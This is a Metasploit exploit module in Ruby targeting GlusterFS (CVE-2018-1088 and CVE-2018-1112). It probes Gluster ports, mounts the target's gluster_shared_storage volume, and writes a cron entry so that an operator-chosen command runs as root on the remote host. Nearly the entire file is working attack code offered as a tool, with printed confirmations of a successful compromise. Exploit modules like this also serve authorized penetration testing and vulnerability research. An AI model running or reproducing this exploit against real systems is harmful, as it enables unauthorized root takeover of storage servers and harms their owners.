##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
require 'socket'
require 'msf/core'
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'GlusterFS: Privilege escalation via gluster_shared_storage',
			'Description'    => %q{	
                A privilege escalation flaw was found in gluster snapshot scheduler. Any gluster client allowed to mount gluster volumes could also mount shared gluster storage volume and escalate privileges by scheduling malicious cronjob via symlink. Set the CMD variable of the linux/$ARCH'/exec payload to the command that will be setup in a cron file to run as root.
            },
            'Arch'          => [ ARCH_X86, ARCH_X64 ],
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Mauro Eldritch (plaguedoktor)'
				],
			'References'     =>
				[
                    [ 'AKA', 'GEVAUDAN' ],
                    [ 'CVE', '2018-1088' ],
                    [ 'CVE', '2018-1112' ],
                    [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-1088' ],
                    [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-1112' ],
                    [ 'URL', 'https://github.com/mauroeldritch/Gevaudan' ]
                ],
            'DefaultOptions' =>
                {
                  'Payload' => 'linux/x86/exec',
                },
			'Platform'          => [ 'linux' ],
			'Targets'        =>
				[
					['glusterfs-server 3.8.8-1', {}]
				],
			'DisclosureDate' => 'Mar 20 2018',
			'DefaultTarget'  => 0))

		register_options(
			[
                OptString.new('RHOST', [ true, 'Remote host to attack', '127.0.0.1']),
                OptString.new('GLUSTERMNT', [ true, 'Directory where the vulnerable volume will be mounted', '/tmp/gevaudan']),
                OptString.new('GLUSTERBIN', [ true, 'Path to mount.glusterfs binary', '/sbin/mount.glusterfs']),
                OptString.new('GLUSTERVOL', [ true, 'Gluster Volume to mount', 'gluster_shared_storage']),
                OptString.new('GLUSTERCRON', [ true, 'Path to gluster cron file', '/snaps/glusterfs_snap_cron_tasks'])
            ], self.class)
    end
    def check
        gluster_ports = [49152, 49153, 49154, 49155, 49156]
        gluster_host = datastore['RHOST']
        gluster_binary = datastore['GLUSTERBIN']
        #Check if binary exists
        if File.file?(gluster_binary) == false
            print_error "Gluster mount binary (#{gluster_binary}) not found."
        end
        open_ports = 0
        gluster_ports.each do | port |
            Socket.tcp("#{gluster_host}", port, connect_timeout: 2) {
                open_ports += 1
                print_good(port + " is open.")
                } rescue false
        end
        if open_ports == 0
            print_error(gluster_host + " doesn't seem to be reachable or running gluster.")
            return Exploit::CheckCode::Safe
        else
            return Exploit::CheckCode::Appears
        end
    end
	def exploit
        gluster_host = datastore['RHOST']
        gluster_mount = datastore['GLUSTERMNT']
        gluster_binary = datastore['GLUSTERBIN']
        gluster_volume = datastore['GLUSTERVOL']
        gluster_cron = datastore['GLUSTERCRON']
        gluster_payload = datastore['CMD']
        #Create mount point folder if doesn't exist. 
        Dir.mkdir "#{gluster_mount}" rescue false
        #Attempt to connect to Gluster.
        print_line "Attempting to exploit Gluster instance on #{gluster_host}..."
        gluster_connect_cmd = "#{gluster_binary} #{gluster_host}:/#{gluster_volume} #{gluster_mount}"
        gluster_output = system(gluster_connect_cmd)
        if gluster_output == true
            print_good "Volume #{gluster_host}:/#{gluster_volume} exploited successfully. Mounted on '#{gluster_mount}'."
            print_line "Volume content (Showing latest 10 entries only):"
            gluster_test_cmd = `ls -ltrh #{gluster_mount} | tail -10`
            print_line "#{gluster_test_cmd}"
        else
            print_error "Error running exploit. Check glusterfs-client logs at '/var/log/glusterfs/' for debug info."
        end
        #Final strike, add a crontab entry 
        begin
            File.write("#{gluster_mount}#{gluster_cron}", "0 6 * * * #{gluster_payload}")
            print_good "Cron file '#{gluster_mount}#{gluster_cron}' altered successfully."
            gluster_cron_cmd = `cat #{gluster_mount}#{gluster_cron}`
            print_good "Cron file injected entry:"
            print_good(gluster_cron_cmd)
            print_good "This will run as root on #{gluster_host}.\n\nDon't forget to unmount #{gluster_mount} after use."
        rescue
            print_error "Unable to inject entries into '#{gluster_mount}#{gluster_cron}'."
        end
	end
end